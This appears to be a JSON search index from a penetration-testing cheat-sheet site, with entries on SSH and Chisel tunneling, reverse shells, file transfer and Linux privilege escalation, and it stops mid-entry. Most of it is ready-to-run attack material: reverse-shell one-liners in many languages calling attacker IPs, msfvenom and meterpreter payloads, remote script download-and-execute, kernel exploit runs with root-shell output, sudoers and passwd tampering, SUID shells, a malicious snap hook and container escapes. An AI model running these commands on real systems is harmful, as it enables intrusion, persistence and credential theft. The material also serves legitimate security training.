						"content": "Introduction In computer networking, port forwarding or port mapping is an application of network address translation that redirects a communication request from one address and port number combination to another. Simple Port Forwarding or Tunneling SSH Port Forwarding Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side. SSH Local Port Forwarding -L is a local tunnel (YOU –&gt; CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if test was blocked at work, you can do the next command. Going to localhost:9000 on your machine, will load test traffic using your other server. root@kali:~$ ssh -N -L 900:test.com:80 user@example.com SSH Remote Port Forwarding -R is a remote tunnel (YOU &lt;– CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse. Sometimes the ssh server is off and you need to ssh back to your attacking machine in order to forward a traffic port. user@target:~$ ssh -N -R example.com:80:test.com:80 user@example.com SSH Dynamic Port Forwarding This is the coolest one because uses SOCKS4 proxy and redirects all traffic sent via proxy to the target machine, which would be similar like launching our scripts from the target machine. First we need to configure proxychains. sudo echo \"socks4 5566\" &gt;&gt; etc proxychains.conf Create the dynamic tunnel with the specified port. ssh -N -D 5566 user@example.com After that all commands that begins with proxychains will be sent through the proxy. sudo proxychains nmap -sV -sC 10.10.10.10 SSH Reverse Dynamic Port Forwarding If the host is not specified ssh creates a socks4 tunnel. So if there are no ssh service on the target machine we can also create a tunnel. ssh -N -R 5566 kali@kali If it’s not possible to setup a tty, because the target machine does not have python installed, we would not be able to put the password on the prompt. So instead of that we will use a pair of keys. ssh-keygen ssh -N -R 5566 -i ~ .ssh id_rsa -o \"UserKnownHostsFile= dev null\" -o \"StrictHostKeyChecking=no\" kali@kali Remember to add the id_rsa.pub key on the authorized keys. echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDORkdAZlHfTTbMZNPX7VaU3yx9dl3a1RwP4Px4SZWpkE3I95P2X9aAD4TvyiyvrEYzhOMymGulE69pAbXnfjvzFpMfQRUBEjrMqQv+jUL62MhpiVaB8AkO9iay2j90mNxLmrqNRSEuDiVpX2eDGcHKAhLno1uOrMkvvzc3HTVfLy8 ukbVmFGCb8TSA9mvcnjTyBeIA67yC5oPeHQ4GMKQIunrcV8XFj2qX4iTDRrUXyLj2socdCVwZAymJzTPbLEY 1oSRw6JkaR+iszQXKl+J9PR6Ev01EkmMPac5iRmtS9+6hXzKV40t6F5gBJGXvFA1qQwfydHLt8noUTYXuYymAx7MW+fO7blrjVVfbHGag03qz1xlQPcaG CtQeV94YWJI47Cj91j6t+iZhj4ntwbgYcrOl3nm 7hpJdrXdOdxFeuEtbUmxdO7ljXsr7q9hKLHONtFVII5+ej8gBvw0N0MtJRnVCIAcjizNCz8gtBsxIVKSV9pxxvagSKeIoKus= mysql@target' &gt; authorized_keys Chisel Chisel is a fast TCP UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Available on Windows and Linux https: github.com jpillora chisel Note: Download a Release Server Start the Chisel server on your attacker machine specifying the port to use. . chisel server -p PORT --reverse Client On the target machine, you need to start the Chisel client, specify the server IP and port, and specify the ports to tunneling. . chisel client IP:PORT R:PORT_KALI:localhost:PORT_VICTIM R:PORT2_KALI:localhost:PORT2_VICTIM rinetd rinetd is a port forwarding tool easily configurable and installable. sudo apt-get install rinetd The rinetd configuration file is etc rinetd.conf that lists all forwarding rules. # bindadress bindport connectaddress connectport options... # 0.0.0.0 80 192.168.1.2 80 # ::1 80 192.168.1.2 80 # 0.0.0.0 80 fe80::1 80 # 127.0.0.1 4000 127.0.0.1 3000 # 127.0.0.1 4000 udp 127.0.0.1 22 [timeout=1200] # 127.0.0.1 8000 udp 192.168.1.2 8000 udp [src=192.168.1.2,timeout=1200] Remember restart the service: sudo service rinetd restart httptunnel (hts) hts is a the httptunnel server which has an easily installation. sudo apt-get install httptunnel The use is similar a rinetd but the configuration is established by parameters. hts --forward-port localhost:8888 example.com:1234 PLINK.exe Plink is a windows based command line port forwarding tool based on the PuTTY project. Same as SSH has local, remote and dynamic port forwarding. plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -R &lt;kali-ip&gt;:80:127.0.0.1:80 &lt;kali-ip&gt; plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -L 127.0.0.1:80:test.com:80 test.com plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -D 5566 test.com Warning: May be in a Reverse Shell the command doen’t works so you need to pipe to: **cmd.exe c echo y plink.exe -ssh …..** NETSH netsh utility is installed by default on every modern version of Windows. netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.0.0.1 connectport=445 connectaddress=192.168.0.1 By default, Windows will block our connections with the Firewall, being administrator we can easily add a rule to let the traffic pass. netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=10.0.0.1 localport=4455 action=allow Doble Tunneling Sometimes in Internal Penetration test we can find the following scenario, where we need to access to a network NET3. Kali has access to NET1. SRV1 has access to NET2. SRV2 has access to NET3. We can access to NET2 via creating a dynamic SSH Tunnel (SOCKS4) from a host on NET1 which have access to NET2 such as SRV1. SRV1 does not have access to NET3. To access to NET3 we need to create a dynamic SSH Tunnel to SRV2, which we don’t have access directly from Kali. SSH Dynamic Port Forwarding Create a Port forwarding From Kali to SRV1 redirecting the SSH port of SRV2 to a local port such as 9998. root@kali~:$ ssh -L 9998:SRV2:22 -N user@SRV1 And finally create the dynamic SSH tunnel to SRV2. root@kali~:$ ssh -N -D 5566 -p 9998 user@localhost Final graph where we can see what we do with the tunnels. SSH Local Port Forwarding To forward only one port we can do a double Local port forwarding. user@SRV1~:$ ssh -N -L 9999:SRV3:80 user@SRV2 root@kali~:$ ssh -N -L 9999:localhost:9999 user@SRV1 Now port 9999 of the kali is the port 80 of SRV3."
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-reverse-shell": {
						"id": "post-exploitation-reverse-shell",
						"title": "Reverse Shell",
						"category": "",
						"url": " /post-exploitation/reverse-shell/",
						"content": "To gain control over a compromised system, an attacker usually aims to gain interactive shell access for RCE. A reverse shell is a connection back that means that the victim connects to the attacker. Be careful with Firewalls, use common ports like 80,443 or 445. Windows Nishang Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. Import-Module .\\Invoke-PowershellTcp.ps1 Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT] Or you can modify the script and append the following line: Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT] And execute directly from memory: start b powershell IEX(New-Object Net.WebClient).downloadString('http: ip-addr:port Invoke-PowerShellTcp.ps1') Be careful, migrate the process to the same machine architecture! Binary With msfvenom we can create a windows tcp reverse shell. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o tmp rev.exe Netcat Netcat is a network tool that allows through a command interpreter and with a simple syntax to open TCP UDP ports in a HOST. It’s not native from windows, so you need to trasnfer the binary. nc.exe -e powershell.exe [IP] [PORT] Be careful, migrate the process to the same machine architecture! Powershell Also we can get a reverse shell without using any external file. powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ip-addr',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()\" We can also use msfvenom hta-psh reverse shell. $ msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of hta-psh file: 6638 bytes &lt;script language=\"VBScript\"&gt; window.moveTo -4000, -4000 Set bwtVGMW = CreateObject(\"Wscript.Shell\") Set tycIa5Pq = CreateObject(\"Scripting.FileSystemObject\") For each path in Split(bwtVGMW.ExpandEnvironmentStrings(\"%PSModulePath%\"),\";\") If tycIa5Pq.FileExists(path + \"\\..\\powershell.exe\") Then bwtVGMW.Run \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAO.... Powercat Powercat is the netcat version written in powershell. Remember first download the script and import the module. powercat -c ip-addr -p port -e cmd.exe Meterpreter First, we need to create our shellcode with msfvenom: msfvenom -p windows meterpreter reverse_tcp --platform windows -a x86 --encoder x86 shikata_ga_nai -f exe LHOST=[IP] LPORT=[PORT] &gt; meterpreter.exe After transfer our shellcode to the target machine, we will start listening with metasploit at the same port: msf&gt; use multi handler msf&gt; set PAYLOAD windows meterpreter reverse_tcp msf&gt; set LPORT [PORT] msf&gt; set LHOST [IP] msf&gt; run When we execute our shellcode we will receive the meterpreter in the handler: .\\meterpreter.exe Be careful, migrate the process to the same machine architecture! Migrating the reverse shell From Powershell: [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess If they don’t sahre the same architecture, we will need to create a new Revershell with the appropiate Powershell path: For 32 bits: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe For 64 bits: C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe From Meterpreter: First we need to list all processes: meterpreter &gt; ps Afther getting the list of all the processs going on we can migrate ourselves to some reliable process: meterpreter &gt; migrate PID Linux There are many ways to get a reverse shell in many differents languages and using many differents binaries. Bash bash -i &gt;&amp; dev tcp 10.0.0.1 8080 0&gt;&amp;1 Perl perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\" bin sh -i\");};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\" bin sh\",\"-i\"]);' PHP php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\" bin sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' Ruby ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\" bin sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' Netcat nc -e bin sh 10.0.0.1 1234 rm tmp f;mkfifo tmp f;cat tmp f| bin sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt; tmp f Socat socat TCP4:10.0.0.1:1234 EXEC: bin bash SSL Socat Using cryptography helps to evade some types of IDS. First we need to create the certificates in out attacking machine. openssl req -newkey rsa:2048 -nodes -keyout rev_shell.key -x509 -days 362 -out rev_shell.crt cat rev_shell.key rev_shell.crt &gt; rev_shell.pem After that on the target machine run socat with OPENSSL: socat OPENSSL:10.0.0.1:443,cert=rev_shell.pem,verify=0 EXEC: bin bash Improve the rev shell to TTY python3 -c 'import pty; pty.spawn(\" bin bash\")' Run to background with Ctrl + Z stty raw -echo;fg export TERM=xterm-265color Don’t use tmux and rlwrap if you want better results. References: https: ironhackers.es herramientas reverse-shell-cheat-sheet https: www.sniferl4bs.com 2017 04 hacking-101-reverse-shell-bind-shell.html https: securityhacklabs.net articulo accediendo-remotamente-a-windows-10-con-metasploit https: www.youtube.com watch?v=fIGvOGrdxyc\\&amp;t=164s https: github.com samratashok nishang"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-transfering-files": {
						"id": "post-exploitation-transfering-files",
						"title": "Transfering Files",
						"category": "",
						"url": " /post-exploitation/transfering-files/",
						"content": "In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa. In order to perform our work we have the need of transfer some files and this post collects some of this methods. Let’s see, these are some possibilities of environment that we can find during our audits. Linux 📤 to Linux 📥 HTTP First we need to start our server with python: python3 -m http.server port python -m SimpleHTTPServer port php -S 0.0.0.0:port ruby -run -e httpd . -p port busybox httpd -f -p port And download our files with Linux basics on the target: wget http: ip-addr:port file.name curl http: ip-addr:port file.name -o file.name axel -a -n 20 -o file.name https: ip-addr:port filen.name #Freebsd fetch -o file.name -q -R http: ip-addr:port file.name Netcat Socat There are more ways with different protocols or programs to transfer our files: nc -lp port &gt; file.name sudo socat TCP4-LISTEN:port,fork file:file.name And on the target: nc -w 3 ip-addr port &lt; file.name sudo socat TCP4:ip-addr:port file:file.name,create FTP (File Transfer Protocol) First we need to start our ftp server, in this case I will use the Python module pyftpdlib, that allows you to set up our ftp server very quickly. To install you run the following command: sudo apt-get install python-pyftpdlib And start the server: python -m pyftpdlib -p 21 Finally you can download the file on the target with: wget ftp: ip-addr file.name [--ftp-user=user] [--ftp-password=password] axel -a -n 20 -o file.name ftp: ip-addr:port filen.name Base64 Encoding This is not the best solution beause you will need to Copy &amp; Paste the output, and if you need to transfer a big file could be so tedious. Btw this are the commands: base64 file.name Copy the result and paste on your machine inside some quotes: base64 -d \"ZmxhZ3tINGNrMW5nTjB0ZXN9Cg==\" &gt; file.name Linux 📤 to Windows 📥 HTTP First we need to start our server with python: python3 -m http.server port python -m SimpleHTTPServer port And download our files with Windows basics on the target: Via CMD: certutil -urlcache -f \"http: ip-addr:port file.name\" file.name powershell -c (New-Object Net.WebClient).DownloadFile('http: ip-addr:port file.name', 'file.name') Via Powershell: (New-Object Net.WebClient).DownloadFile('http: ip-addr:port file.name', 'file.name') Import Powershell Script without storing in memory iex (New-Object System.Net.Webclient).DownloadString('http: ip-addr:port file.ps1') iex (iwr 'http: ip-addr:port file.ps1') SMB Server Message Block (SMB) is a network protocol that allows us share files, printers, etc, between nodes that are Microsoft Windows. To start a smb server you need to invoke smbserver.py class from impacket. python smbserver.py NAME FOLDER And simply copy the file in the share volume to the target: copy \\\\ip-addr\\NAME\\file.name .\\file.name Maybe there are some others ways to transfer files between Linux and Windows, but with these methods is more than enough to do our job! Windows 📤 to Linux 📥 This section will be similar to previous one. HTTP If the target have python installed you can start the server in the same way: (Be careful on windows the python script in python2.7 is http.server and not SimpleHTTPServer) python -m http.server And download our files with Linux basics on the target: wget http: ip-addr:port file.name curl http: ip-addr:port file.name -o file.name SMB In that case the smb server will also start on the attacker’s machine (Linux). To start a smb server you need to invoke smbserver.py class from impacket: python smbserver.py NAME FOLDER But the differece will be the order of copy arguments: copy .\\file.name \\\\ip-addr\\NAME\\file.name Powercat Powercat is essentially the powershell version of netcat. First need to install in yout kali Machine to download the script: Installation: sudo apt install powercat Then you will find the script in the following directory: usr share windows-resources powercat powercat.ps1 Onced transfered the script and imported the module, start the listener on the kali nc -lp port &gt; file.name And execute the following command to send the desired file. powercat -c ip-addr -p port -i file.name References: https: ironhackers.es cheatsheet transferir-archivos-post-explotacion-cheatsheet https: guide.offsecnewbie.com transferring-files https: medium.com @PenTest_duck almost-all-the-ways-to-file-transfer-1bd6bf710d65"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-linux-privesc": {
						"id": "privilege-escalation-linux-privesc",
						"title": "Linux Privesc",
						"category": "",
						"url": " /privilege-escalation/linux-privesc/",
						"content": "Privilege Escalation usually involves going from a lower permission to a higher permission. Enumeration Scripts: There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples: LinEnum: https: github.com rebootuser LinEnum LinPEAS: https: github.com carlospolop privilege-escalation-awesome-scripts-suite tree master linPEAS Kernel Vulnerabilities We can exploit some kernel vulnerabilities in order to privesc. linux-exploit-suggester.sh is an amazing script that do this work. https: github.com mzet- linux-exploit-suggester . linux-exploit-suggester.sh Compiling Exploits Sometimes we need to compile our exploits in order to get the binary or executable. For 64-bits: gcc exploit.c -o exploit For 32-bits: gcc -m32 exploit.c -o exploit #i686 and older devices gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit Finally we just need to give execution permissions. chmod u+x executablename . executablename DirtyPipe - Linux Kernel &lt;= 5.8 DirtyPipe allows overwriting data in arbitrary read-only files that leverages to a privilege escalation due to unprivileged process can inject code into root processes. It is similar to DirtyC0w. Download the exploit from the following repository https: github.com Arinerron CVE-2022-0847-DirtyPipe-Exploit blob main compile.sh. Compile it: gcc exploit.c -o dirtypipe Transfer the exploit to the target machine and execute it. . dirtypipe root .ssh authorized_keys 1 $'\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo4ILTzBpODN8ubP+Qe3rhWgiPQqldRbCkkdcQb3vChet2SIVr3dM4Y5RQ11cYas1+bPT99nEuu++G7SiEN3juWhK3ymb9g+vC3DdACQbxsUhG4octS1K1N3D4grijfH9YfDoYW37VafhNE6PBa2mZu8KMBlTYRLOw1fP02ncZt0PFiYS0tD2lrKvr2nFBNDrJhRtHtMf6YUjlLEb7p2br z4P40z0vNr2YpEDpTEorW6RTZ802DlinSMpCdkt\\n' https: dirtypipe.cm4all.com https: github.com rahul1406 cve-2022-0847dirtypipe-exploit eBPF_verifier - Linux Kernel &lt; 4.13.9 $ gcc cve-2017-16995.c -o cve-2017-16995 $ chmod +x cve-2017-16995 $ . cve-2017-16995 [.] [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t) [.] [.] ** This vulnerability cannot be exploited at all on authentic grsecurity kernel ** [.] [*] creating bpf map [*] sneaking evil bpf past the verifier [*] creating socketpair() [*] attaching bpf backdoor to socket [*] skbuff =&gt; ffff88002dc42800 [*] Leaking sock struct from ffff88003d00d400 [*] Sock-&gt;sk_rcvtimeo at offset 472 [*] Cred structure at ffff8800354a0600 [*] UID from cred structure: 33, matches the current: 33 [*] hammering cred structure at ffff8800354a0600 [*] credentials patched, launching shell... # id uid=0(root) gid=0(root) groups=0(root),33(www-data) https: www.exploit-db.com exploits 45010 DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9 DirtyPipe allows overwriting data in arbitrary read-only files that leverages to a privilege escalation. gcc -pthread dirty.c -o dirty -lcrypt Transfer the exploit to the target machine. chmod +x dirty . dirty https: github.com FireFart dirtycow blob master dirty.c Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo Ubuntu x86 x64) $ gcc mempodipper.c -o mempodipper $ chmod +x mempodipper $ . mempodipper =============================== = Mempodipper = = by zx2c4 = = Jan 21, 2012 = =============================== [+] Waiting for transferred fd in parent. [+] Executing child from child fork. [+] Opening parent mem proc 1977 mem in child. [+] Sending fd 3 to parent. [+] Received fd at 5. [+] Assigning fd 5 to stderr. [+] Reading su for exit@plt. [+] Resolved exit@plt to 0x8049520. [+] Calculating su padding. [+] Seeking to offset 0x8049514. [+] Executing su with shellcode. # whoami root # https: www.exploit-db.com exploits 18411 Abusing SUID GUID Files Check for files with the SUID GUID bit set. This means that the file or files can be run with permissions of the file(s) owner group. In case of super-user, we can leverage this to get a shell with these privileges. But when a special permission is given to each user it becomes SUID or SGID. When a extra bit “4” is set to user (Owner) it becomes SUID (Set user ID) and wen bit “2” is set to group it becomes SGID (Set Group ID). SUID: rws-rwx-rws GUID: rwx-rws-rwx Permission On Files On Directories SUID Bit User executes the file with permissions of the file owner. - SGID Bit User executes the file with the permission of the group owner. File created in directory gets the same group owner. Sticky Bit - Users are prevented from deleting files from others users. Finding SUID GUID Binaries: find -perm -u=s -type f 2&gt; dev null find -perm -g=s -type f 2&gt; dev null Exploiting PATH Variable PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user. How does this let us escalate privileges? Let’s say we need an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. We can rewrite the PATH variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the PATH variable: export PATH= tmp echo $PATH And create a file with execution permissions with the same binary name: echo \" bin bash\" &gt; tmp ps bin chmod +x tmp ps Finally when the SUID files calls ps function, instead of showing system processes will execute our command. Remember: To exploit PATH variable we need a SUID File to gain privileges otherwise it will be executed as normal user. Writeable Folders We can elevate our privileges some times when we have write permissions in some specific directories. Note: With write permissions on the folder we can create delete move files but not modify them. On PATH variable When we can write on folders such as usr local bin usr bin or some others that are included on the PATH variable we can escalate our privileges by modifying or creating a new binary that will be executed as root. SSH port open When we ssh a machine root executes run-parts binary so we add a malicious binary on the path. Look Executing files with root to see which binary we can fit our needs. Abusing Wildcards (*) Tar Argument Injection in root cronjob Imagine you compromise a low-level user on a system and you figure out this command is running as root: cd var log mon &amp;&amp; tar -zcf tmp mon.tar.gz * We want to go with sudoers file as we are lazy and just sudo bash, so let’s see…. echo 'echo \"user ALL=(root) NOPASSWD: ALL\" &gt; etc sudoers' &gt; privesc.sh echo \"\" &gt; \"--checkpoint-action=exec=sh privesc.sh\" echo \"\" &gt; --checkpoint=1 Writeable etc passwd The etc passwd file stores essential information, which is required during login. In other words, it stores user account information. if we have a writable etc passwd file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash. openssl passwd -1 -salt [username] [password] openssl passwd [password] Finally append the following string to etc passwd file: [USERNAME]:[HASH]:0:0:root: root: bin bash And finally su to this new user to obtain a root shell: su [USERNAME] GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. Firstly, we need to check the sudo permissions on binaries: sudo -l After that search on GTOBins web to search how to escape from that binary and obtain a shell: https: gtfobins.github.io User user may run the following commands on armageddon: (root) NOPASSWD: usr bin someBinary Remember: Do not forget to run the command as sudo! SETENV permission This mean that we can set some environment variables to run the command. User user may run the following commands on admirer: (ALL) SETENV: opt scripts some.py Search for a library, create a copy in tmp and execute commands. some.py import sys sys.exit(10) We can create a sys.py file on tmp. import os def exit(a): os.system(\"cp bin bash tmp rev\") os.system(\"chmod u+s tmp rev\") Finally open the backdoor. tmp rev -p rev-4.4# id uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user) Snap install User user may run the following commands on armageddon: (root) NOPASSWD: usr bin snap install * When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet. https: ubuntu.com tutorials create-your-first-snap#3-building-a-snap-is-easy https: shenaniganslabs.io 2019 02 13 Dirty-Sock.html mkdir privesnap cd privesnap snapcraft init touch snap hooks install We need to create a malicious snap hooks install file, and modify snap snapcraft.yaml install #! bin bash # dirty_sock:dirty_sock useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s bin bash usermod -aG sudo dirty_sock echo \"dirty_sock ALL=(ALL:ALL) ALL\" &gt;&gt; etc sudoers snapcraft.yaml name: privesnap version: '0.1' summary: Empty snap, used for exploit description: | See https: github.com initstring dirty_sock grade: devel confinement: devmode parts: my-part: plugin: nil Linux Capabilities Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. getcap -r 2&gt; dev null Check the following link to see what means each capability: https: man7.org linux man-pages man7 capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute. Note: ep capability means that can read and write any file on the filesystem. More info in: https: linux-audit.com linux-capabilities-101 Exploiting Crontab The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks. To view what cronjobs are active we need to cat the etc crontab file: cat etc crontab If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task. Abusing privileges (Group memberships) sudo Thats it, you’re already root: sudo su - lxd A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package. With Internet lxc init ubuntu:16:04 myimage -c security.privileged=true lxc config device add myimage whatever disk source= path= mnt root recursive=true lxc start test lxc exec test bash Without Internet Build an Alpine image and start it using the flag security.privileged=true, forcing the container to interact as root with the host filesystem. # build a simple alpine image git clone https: github.com saghul lxd-alpine-builder cd lxd-alpine-builder sed -i 's,yaml_path=\"latest-stable releases $apk_arch latest-releases.yaml\",yaml_path=\"v3.8 releases $apk_arch latest-releases.yaml\",' build-alpine sudo . build-alpine -a i686 Also you can download directly the image from ubuntu: wget http: cloud-images.ubuntu.com xenial current xenial-server-cloudimg-amd64-root.tar.xz wget http: cloud-images.ubuntu.com xenial current xenial-server-cloudimg-amd64-lxd.tar.xz And exploit it: # import the image lxc image import . alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail. lxc image import xenial-server-cloudimg-amd64-*.tar.xz --alias myimage # Or this depending if you downloaded # before running the image, start and configure the lxd storage pool as default lxd init # run the image lxc init myimage mycontainer -c security.privileged=true # mount the root into the image lxc config device add mycontainer mydevice disk source= path= mnt root recursive=true # interact with the container lxc start mycontainer lxc exec mycontainer bin sh adm All members of the group admin have access to logs files: var log disk All members of the gorup disk have full access to the filesystem. df -h #search disk debugfs dev sda1 debugfs: cd root debugfs: cat root .ssh id_rsa debugfs: cat etc shadow We can also write files on the filesystem. debugfs -w dev sda1 debugfs: dump file1.txt file2.txt #Copy file1.txt to file2.txt Hint: Files owned by root are now writable such as etc passwd or etc shadow. video The video group has access to view the screen output of all opened sessions (tty). With w command we can see the who is logged on the server: moshe@falafel: var log$ w 17:35:42 up 3:40, 3 users, load average: 0.22, 0.09, 0.08 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT yossi tty1 13:55 3:40m 0.05s 0.04s -bash moshe pts 0 10.10.14.20 17:18 0.00s 0.08s 0.00s w moshe pts 1 10.10.14.20 17:18 15:17 0.03s 0.03s bash So we need to grab the video output and graphics configuration. moshe@falafel: var log$ cat dev fb0 &gt; tmp screen.raw moshe@falafel: var log$ cat sys class graphics fb0 virtual_size 1176,885 Finally we can open the data with GIMP. docker Since we are member of docker group, we can mount the root filesystem of the host machine to an instance’s volume. $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 775349758637 22 months ago 64.2MB alpine latest 965ea09ff2eb 22 months ago 5.55MB centos latest 0f3e07c0138f 23 months ago 220MB $ docker run -it --rm -v : mnt &lt;imagename&gt; chroot mnt bash # Edit etc passwd to get root access to the host We can also mount the filesystem and the network access. $ docker run --rm -it --pid=host --net=host --privileged -v : mnt &lt;imagename&gt; chroot mnt bashbash Docker Breakout Privileged Flag enabled When we start a docker with the privileged flag --privileged , we give the sufficient permission to mount the host filesystem inside the docker. When the root user is owned, we will search the host drive: fdisk -l After finding the Linux sda we will mount it: mkdir -p mnt host_drive mount dev sda1 mnt host_drive Finally, just cd to out new mount point to find all host files. Docker.sock available By default, when the docker command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at var run docker.sock. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose var run docker.sock, locally or remotely, could lead to a full environment take over. Check if socket is available ls -alh var run docker.sock List all containers curl -ik --unix-socket var run docker.sock http: &lt;docker_host&gt;:PORT containers json Create an exec curl -ik -X POST --unix-socket var run docker.sock -H \"Content-Type: application json\" --data-binary '{\"AttachStdin\": true,\"AttachStdout\": true,\"AttachStderr\": true,\"Cmd\": [\"cat\", \" etc passwd\"],\"DetachKeys\": \"ctrl-p,ctrl-q\",\"Privileged\": true,\"Tty\": true}' http: &lt;docker_host&gt;:PORT containers &lt;container_id&gt; exec Start the exec curl -ik -X POST --unix-socket var run docker.sock -H \"Content-Type: application json\" --data-binary '{\"Detach\": false,\"Tty\": true} http: &lt;docker_host&gt;:PORT exec &lt;exec_id&gt; start' https: dejandayoff.com the-danger-of-exposing-docker.sock USBCreator D-Bus A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. gdbus call --system --dest com.ubuntu.USBCreator --object-path com ubuntu USBCreator --method com.ubuntu.USBCreator.Image root .ssh id_rsa id_rsa true https: unit42.paloaltonetworks.com usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop Executing files with root Adding a new SUDOER user (Bash) We can create a new user and add it to the sudoers file: #! bin bash useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s bin bash usermod -aG sudo dirty_sock echo \"dirty_sock ALL=(ALL:ALL) ALL\" &gt;&gt; etc sudoers Creating a SUID shell (bash) We can copy the bash file to temp and give it SUID permissions. cp bin bash tmp bash chmod u+s tmp bash tmp bash -p Creating a SUID file (c) #include &lt;unistd.h&gt; int main() { setreuid(0,0); execl(\" bin bash\", \"bash\", (char *)NULL); return 0; } Creating a SUID shell (C) We can write the following C code in order to obtain a bash shell: #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main (void) { char *argv[] = { \" bin bash\", \"-p\", NULL }; execve(argv[0], argv, NULL); } We just need to compile and give SUID permissions from root in our attacking machine. gcc -m32 shell.c -o shell root@kali $ chmod +s shell Finally we need to transfer the file with the command execution. tmp shell -p Capabilities Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Search files with capabilities: getcap -r 2&gt; dev null Python Capability python3 